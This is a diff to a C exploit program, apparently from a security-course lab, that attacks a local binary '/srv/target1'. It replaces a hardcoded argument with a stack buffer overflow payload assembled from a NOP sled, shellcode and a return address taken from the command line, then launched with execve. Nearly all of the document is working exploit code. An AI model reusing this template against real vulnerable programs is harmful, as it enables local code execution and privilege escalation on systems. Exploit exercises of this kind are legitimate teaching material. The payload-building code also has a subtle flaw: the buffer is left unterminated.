@@ -7,18 +7,32 @@
 
 #define TARGET "/srv/target1"
 
-int main(void)
+int main(int argc, char *argv[])
 {
-  char *args[3]; 
-  char *env[1];
-  
-  args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd4\xff\xff";
-  args[2] = NULL;
-  
-  env[0] = shellcode;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <nop_length> <eip_address>\n", argv[0]);
+        return 1;
+    }
 
-  return 0;
+    int nop_length = atoi(argv[1]);
+    uint32_t eip_address = strtoul(argv[2], NULL, 16);
+
+    char *args[3];
+    char *env[1];
+
+    char payload[1000];
+    memset(payload, 0x90, nop_length);
+    memcpy(payload + nop_length, shellcode, strlen(shellcode));
+    *(uint32_t *)(payload + nop_length + strlen(shellcode) + 44 - 4) = eip_address;
+
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
+
+    env[0] = NULL;
+
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+
+    return 0;
 }
